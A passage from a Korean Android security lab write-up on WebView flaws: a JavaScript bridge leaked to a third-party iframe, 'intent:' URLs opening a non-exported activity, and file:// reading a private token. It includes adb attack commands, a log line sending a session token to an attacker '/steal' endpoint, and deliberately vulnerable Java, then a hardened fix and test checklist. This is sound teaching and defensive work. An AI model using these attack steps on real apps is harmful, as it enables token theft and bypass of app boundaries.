02:54:10 :8720 GET /app/frame.html
02:54:12 :8721 GET /steal?token=LAB-SESSION-7f3a91&frame=iframe
02:54:13 :8720 GET /favicon.ico
```

(defaults 줄은 위 실험과 같아 생략했다.) 최상위 origin은 8720으로 앱 자신의 것이 맞는데, `topFrame=false`인 8721 iframe도 브리지를 보고 토큰을 꺼내 갔다. 서버 로그에 `frame=iframe` 신호가 찍혔다. iframe 문서 자체를 받는 요청은 이번 로그에 없었는데, 앞 실험에서 받은 것을 WebView 캐시에서 꺼낸 것으로 보인다. 확인은 하지 않았다.

![LinkLab 화면에 LinkLab news (own origin 8720) with a third-party iframe 제목과 빨간 테두리 iframe. iframe 안에 attacker page (port 8721), typeof SeikaBridge=object, enumerable=getToken,log, getToken()=LAB-SESSION-7f3a91, sent to http://10.0.2.2:8721/steal이 보이는 화면](/assets/img/android-mastery/p1c20/43-device-iframe-webview.png)

`addJavascriptInterface` 문서가 바로 이 상황을 적어 두었다. 객체는 모든 프레임에 노출되고, 앱 쪽에서는 호출한 프레임의 origin을 알 방법이 없으니, iframe 안에서라도 서드파티 콘텐츠가 뜰 수 있다면 호출자를 믿지 말라는 것이다.

![AOSP android-13.0.0_r84 WebView.java 1892~1925행 addJavascriptInterface javadoc의 IMPORTANT 목록. JELLY_BEAN 이하 대상 앱과 4.2 미만 기기에서 리플렉션 위험, JavaScript가 WebView의 private background thread에서 Java 객체와 상호작용, "Because the object is exposed to all the frames" 호출 프레임 origin을 알 수 없다는 문단, LOLLIPOP 이상에서 메서드가 열거 가능하다는 항목](/assets/img/android-mastery/p1c20/05-src-a13-webview-bridge-frames.png)

[WebView.java L1892-1925](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/webkit/WebView.java#1892)의 목록 중 열거 가능하다는 항목은 앞 실험의 `enumerable=getToken,log`로, 백그라운드 스레드 항목은 `thread=JavaBridge`로 확인됐다. 브리지가 꼭 필요하면 노출 대상 origin을 정할 수 있는 androidx.webkit의 `addWebMessageListener` 같은 API로 옮기는 편이 낫다. 이번 실습에서 그 API를 돌려 보지는 않았다.

## intent: 링크 하나로 export하지 않은 화면이 열렸다

플랫폼 WebView는 `intent:` URL을 스스로 실행하지 않는다. 그 일을 하는 것은 앱이 직접 쓴 `shouldOverrideUrlLoading`이다. LinkLab의 코드는 흔히 보는 형태다.

```java
// WebActivity.java 발췌 (shouldOverrideUrlLoading)
if (u.startsWith("intent:")) {
    try {
        Intent i = Intent.parseUri(u, Intent.URI_INTENT_SCHEME);
        Log.w(Ui.TAG, "intent: parsed -> " + i + " ; startActivity as LinkLab");
        startActivity(i);
    } catch (Exception e) {
        Log.e(Ui.TAG, "intent: failed " + e);
    }
    return true;
}
```

`Intent.parseUri`는 일을 `parseUriInternal`에 넘기고, 거기서 `component=` 항목이 Intent의 컴포넌트가 된다([Intent.java `parseUriInternal`의 `component=` 처리, L7698](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/content/Intent.java#7698)). 공격자 페이지(`intent.html`)는 1.5초 뒤 `intent:#Intent;component=io.seika.linklab/.InternalActivity;S.note=from-evil-page;end`로 이동한다.

```bash
adb -s $S shell am force-stop io.seika.linklab
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.linkthief/.AttackActivity --es mode web --es url http://10.0.2.2:8721/evil/intent.html
sleep 6
adb -s $S logcat -d -v tag -s LINKLAB LINKTHIEF
```

![LinkThief가 WebActivity에 intent.html을 넣자 console intent.html loaded, navigating to intent:#Intent;component=io.seika.linklab/.InternalActivity;S.note=from-evil-page;end, shouldOverrideUrlLoading mainFrame=true, intent: parsed -> Intent act=VIEW cmp=io.seika.linklab/.InternalActivity startActivity as LinkLab, LinkLab InternalActivity (exported=false) reached, note=from-evil-page, referrer=android-app://io.seika.linklab가 찍힌 터미널](/assets/img/android-mastery/p1c20/44-device-intent.png)

사용자 터치 없이 스크립트 이동만으로도 `shouldOverrideUrlLoading`이 불렸고, LinkLab이 자기 이름으로 `startActivity`를 해서 `InternalActivity (exported=false) reached`, `note=from-evil-page`가 찍혔다. referrer는 LinkLab 자신(`android-app://io.seika.linklab`)이다. 앞에서 LinkThief가 같은 컴포넌트를 직접 부르다 `uid=10180`으로 거부당했는데, 이번에는 웹 페이지가 LinkLab을 대리인으로 세워 앱 자신만 열 수 있는 화면에 공격자가 고른 extra를 넣었다.

## file:// 접근과 targetSdk에 따라 바뀌는 기본값

같은 `WebActivity`에 이번에는 LinkLab 샌드박스 안의 파일 경로를 넣었다. `WebActivity`는 시작할 때 `files/secret.txt`에 리프레시 토큰을 써 둔다.

```bash
adb -s $S shell am force-stop io.seika.linklab
adb -s $S logcat -c
adb -s $S shell am start -n io.seika.linkthief/.AttackActivity --es mode web --es url file:///data/user/0/io.seika.linklab/files/secret.txt
sleep 4
adb -s $S logcat -d -v tag -s LINKLAB
```

로그에는 `onPageFinished file:///data/user/0/io.seika.linklab/files/secret.txt`가 남았고, 화면에는 파일 내용이 떴다. 다른 앱은 읽을 수 없는 파일이 LinkLab의 UID로 열렸다.

![LinkLab 제목 아래 WebView에 refresh_token=LAB-REFRESH-0c55e2 (private file of io.seika.linklab) 한 줄이 표시된 화면](/assets/img/android-mastery/p1c20/47-device-file-secret.png)

이번 경로에서는 화면에 띄우는 데서 끝났다. 이 파일을 공격자 서버로 보내려면 `file://` 문서 안의 스크립트가 다른 파일이나 다른 origin을 읽어야 하는데, 그건 `allowFileAccessFromFileURLs`와 `allowUniversalAccessFromFileURLs`가 막는다. 두 값은 targetSdk가 JELLY_BEAN(16) 이상이면 기본 `false`이고([WebSettings.java L1026 이하](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/webkit/WebSettings.java#1026)) LinkLab도 건드리지 않았다(로그의 `false`). 공격자가 기기에 HTML 파일을 심어 둘 수 있거나 앱이 이 두 플래그까지 켰다면 이야기가 달라진다. 이번 실습에서는 그 조합을 돌리지 않았다.

`setAllowFileAccess`의 기본값은 앱의 targetSdk에 따라 갈린다. 같은 코드를 targetSdk 29로 빌드한 `linklab-t29.apk`로 바꿔 깔아 기본값 로그를 비교했다.

```bash
adb -s $S logcat -c
adb -s $S shell am start -S -W -n io.seika.linklab/.WebActivity --es url about:blank
sleep 2
adb -s $S logcat -d -v tag -s LINKLAB | grep defaults
adb -s $S install -r out/linklab-t29.apk
adb -s $S logcat -c
adb -s $S shell am start -S -W -n io.seika.linklab/.WebActivity --es url about:blank
sleep 2
adb -s $S logcat -d -v tag -s LINKLAB | grep defaults
adb -s $S install -r out/linklab.apk
```

![같은 기기에서 targetSdk 33 빌드는 defaults 줄이 allowFileAccess=false targetSdk=33, adb install -r out/linklab-t29.apk 뒤에는 allowFileAccess=true targetSdk=29로 바뀌고, 마지막에 out/linklab.apk를 다시 설치해 Success가 나온 터미널](/assets/img/android-mastery/p1c20/48-device-file-default.png)

targetSdk 33에서는 `allowFileAccess=false`, 29에서는 `true`였다. 문서도 Q(29) 이하를 대상으로 하면 `true`, R(30) 이상이면 `false`라고 적는다. 오래된 targetSdk를 유지하는 앱은 코드 한 줄 안 써도 파일 접근이 켜진다. 다만 이번 `WebActivity`처럼 코드에서 `true`로 켜 버리면 targetSdk와 상관없이 열린다.

![AOSP android-13.0.0_r84 WebSettings.java 393~410행 setAllowFileAccess javadoc. 외부에서 받은 file:// URL을 열지 말라는 Note, WebViewAssetLoader 권장, Q 이하 대상 앱은 명시적으로 false로 두라는 문장, The default value is true for apps targeting Q and below, and false when targeting R and above](/assets/img/android-mastery/p1c20/06-src-a13-allowfileaccess-default.png)

이 javadoc은 [WebSettings.java L393-410](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/webkit/WebSettings.java#393)이다. `setJavaScriptEnabled`의 기본값이 `false`라는 것도 같은 파일에 있고([L1005-1010](https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-13.0.0_r84/core/java/android/webkit/WebSettings.java#1005)), 모든 로그의 `javaScriptEnabled=false`가 그 값이다.

## 고친 WebView에서 다시 돌려 본 결과

`SafeWebActivity`는 위에서 문제가 된 설정을 하나씩 닫았다. 초기 URL과 모든 메인 프레임 이동을 자기 origin 하나(실습에서는 `http://10.0.2.2:8720`, 실서비스라면 자기 https 도메인)로 묶고, 브리지를 붙이지 않고, 파일·content 접근을 targetSdk 기본값에 맡기지 않고 명시적으로 끈다. `intent:`는 Chrome과 비슷하게 BROWSABLE을 강제하고 컴포넌트·selector를 지우고 플래그도 비운 뒤에만 실행한다. Chrome은 플래그를 0으로 만들지 않고 허용 목록으로 걸러 내니 똑같지는 않다.

```java
// apps/linklab/src/io/seika/linklab/SafeWebActivity.java 발췌
static boolean allowed(Uri u) {
    return u != null && "http".equals(u.getScheme()) && "10.0.2.2".equals(u.getHost()) && u.getPort() == 8720;
}
...
s.setJavaScriptEnabled(true);   // own pages need JS
s.setAllowFileAccess(false);    // explicit, whatever the targetSdk default is
s.setAllowContentAccess(false);
// no addJavascriptInterface at all
...
@Override public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest r) {
    Uri u = r.getUrl();
    if ("intent".equals(u.getScheme())) {
        openIntentSafely(u.toString());
        return true;
    }
    if (allowed(u)) return false;
    Log.w(Ui.TAG, "SafeWeb blocked navigation " + u);
    return true;
}
...
void openIntentSafely(String uri) {
    try {
        Intent i = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
        i.addCategory(Intent.CATEGORY_BROWSABLE);
        i.setComponent(null);
        i.setSelector(null);
        i.setFlags(0);
        Log.i(Ui.TAG, "SafeWeb intent: sanitized -> " + i);
        startActivity(i);
    } catch (ActivityNotFoundException e) {
        Log.w(Ui.TAG, "SafeWeb intent: no BROWSABLE handler -> " + e.getMessage());
    } catch (Exception e) {
        Log.w(Ui.TAG, "SafeWeb intent: rejected " + e);
    }
}
```

공격자 페이지, 비공개 파일, 자기 페이지, 그리고 같은 `intent:` 링크를 따라가는 자기 페이지(`8720/app/intent.html`, note는 `from-own-page`)를 차례로 넣었다.

```bash
adb -s $S logcat -c
adb -s $S shell am start -S -n io.seika.linklab/.SafeWebActivity --es url http://10.0.2.2:8721/evil/bridge.html
sleep 3
adb -s $S shell am start -S -n io.seika.linklab/.SafeWebActivity --es url file:///data/user/0/io.seika.linklab/files/secret.txt
sleep 3
adb -s $S shell am start -S -n io.seika.linklab/.SafeWebActivity --es url http://10.0.2.2:8720/app/index.html
sleep 4
adb -s $S shell am start -S -n io.seika.linklab/.SafeWebActivity --es url http://10.0.2.2:8720/app/intent.html
sleep 5
adb -s $S logcat -d -v tag -s LINKLAB
```

![SafeWebActivity 로그. SafeWeb refused initial url http://10.0.2.2:8721/evil/bridge.html, SafeWeb refused initial url file:///data/user/0/io.seika.linklab/files/secret.txt, SafeWeb load http://10.0.2.2:8720/app/index.html, safe console: own page typeof SeikaBridge=undefined, SafeWeb intent: sanitized -> Intent act=VIEW cat=[android.intent.category.BROWSABLE] (has extras)](/assets/img/android-mastery/p1c20/50-device-safe.png)

8721 페이지와 `file://` 경로는 초기 단계에서 거부됐고, 이 실행 동안 서버 로그에는 8721 요청이 하나도 없었다. 자기 페이지에서도 `SeikaBridge`는 `undefined`다. `intent:` 링크는 컴포넌트가 빠진 `act=VIEW cat=[BROWSABLE]` Intent로 바뀌었고 `InternalActivity`까지 가지 못했다.

그런데 소독한 Intent가 막다른 길이 될 거라는 예상은 빗나갔다. `ActivityNotFoundException`이 날 줄 알았는데 `startActivity`가 성공하고 선택창이 떴다.

![LinkLab의 own page (8720) following the same intent: link 화면이 어둡게 깔리고, 그 위 Open with 시트에 구름 아이콘의 Backup 항목 두 개가 나열되며 Just once와 Always가 비활성인 화면](/assets/img/android-mastery/p1c20/51-device-safe-gms-chooser.png)

같은 모양(VIEW + BROWSABLE, data 없음)으로 질의하면 이 이미지에서는 Google Play 서비스의 액티비티들이 걸렸다.

```bash
adb -s $S shell pm query-activities --brief -a android.intent.action.VIEW -c android.intent.category.BROWSABLE
```

```
5 activities found:
  Activity #0:
    priority=0 preferredOrder=0 match=0x108000 specificIndex=-1 isDefault=true
    com.google.android.gms/.adsidentity.settings.AdsIdentitySettingsActivity
  Activity #1:
    priority=0 preferredOrder=0 match=0x108000 specificIndex=-1 isDefault=true
    com.google.android.gms/.backup.component.BackupSettingsCollapsingActivity
  Activity #2:
    priority=0 preferredOrder=0 match=0x108000 specificIndex=-1 isDefault=true
    com.google.android.gms/.backup.component.BackupSettingsActivity
  Activity #3:
    priority=0 preferredOrder=0 match=0x108000 specificIndex=-1 isDefault=false
    com.android.cts.ctsshim/.InstallPriority
  Activity #4:
    priority=0 preferredOrder=0 match=0x108000 specificIndex=-1 isDefault=false
    com.android.cts.priv.ctsshim/.InstallPriority
```

선택창에는 Backup 두 개만 보였고, 광고 ID 설정 액티비티가 빠진 이유는 따로 확인하지 않았다. 소독은 비공개 컴포넌트를 지켰지만, 웹 페이지가 BROWSABLE을 연 다른 앱의 화면을 띄우는 길은 남는다. 사용자 제스처 없이 스크립트가 시작한 이동이었는데도 확인 단계 없이 바로 선택창이 떴다. 앱 안의 WebView에 그 정도도 필요 없다면 `intent:`는 아예 거부하거나, 이동할 패키지를 허용 목록으로 묶는 편이 깔끔하다.

## 방어를 확인하는 명령들

로그인 콜백은 커스텀 스킴에 토큰을 싣지 않는 게 먼저다. 콜백을 검증된 https App Link로 받고, OAuth라면 PKCE([RFC 7636](https://www.rfc-editor.org/rfc/rfc7636))로 가로챈 인가 코드만으로는 토큰을 바꿀 수 없게 한다. PKCE 흐름은 이번 실습에서 돌리지 않았다. 스킴을 남겨야 한다면 같은 스킴을 받는 앱이 몇 개인지 기기에서 바로 볼 수 있다. 위의 `pm query-activities ... -d seikalab://cb?...` 결과에 자기 앱 하나만 나와야 정상이다.

App Link에서 먼저 확인할 것은 assetlinks.json의 지문이 배포 키와 맞는지다. Play 앱 서명을 쓰면 업로드 키가 아니라 Play가 다시 서명한 키의 지문을 올려야 한다. 링크를 받는 Activity는 어차피 누구나 명시적으로 부를 수 있으니 URL의 경로와 파라미터를 그 자리에서 검사해야 한다. 배포 후에는 `pm get-app-links`에서 도메인 상태가 `verified`로 나오는지 보고, 1024 같은 숫자가 나오면 검증 실패다.

WebView는 다음 순서로 돌려 보면 회귀가 바로 드러난다. 각 단계의 기대값은 위 `SafeWebActivity` 로그와 같다.

1. 허용 origin 밖의 URL을 extra로 넣고 `refused`가 찍히는지, 서버 로그에 요청이 없는지 본다.
2. 자기 페이지에서 `typeof <브리지이름>`이 `undefined`인지 본다. 브리지를 남겨야 한다면 서드파티 iframe이 섞인 페이지로 같은 시험을 한다.
3. `file:///data/user/0/<패키지>/files/...`를 넣어 거부되는지 본다. targetSdk 29 이하 빌드가 있다면 그 빌드에서도 한다.
4. `intent:#Intent;component=<비공개 Activity>;end` 링크를 가진 페이지를 띄워 그 Activity가 뜨지 않는지 본다.

| 경로 | 취약한 WebActivity | SafeWebActivity |
|---|---|---|
| 공격자 origin을 메인 프레임으로 | 토큰 `LAB-SESSION-7f3a91` 유출 | `refused initial url` |
| 자기 페이지 속 서드파티 iframe | 토큰 유출(`frame=iframe`) | 브리지 없음(`undefined`) |
| `file://` 비공개 파일 | `LAB-REFRESH-0c55e2` 표시 | `refused initial url` |
| `intent:` 비공개 Activity | `InternalActivity` 도달 | 컴포넌트 제거, GMS 선택창 |

*다음 글: [Ghidra·Rizin native 분석](/posts/android-lab-p1c21-ghidra-rizin-native/)*
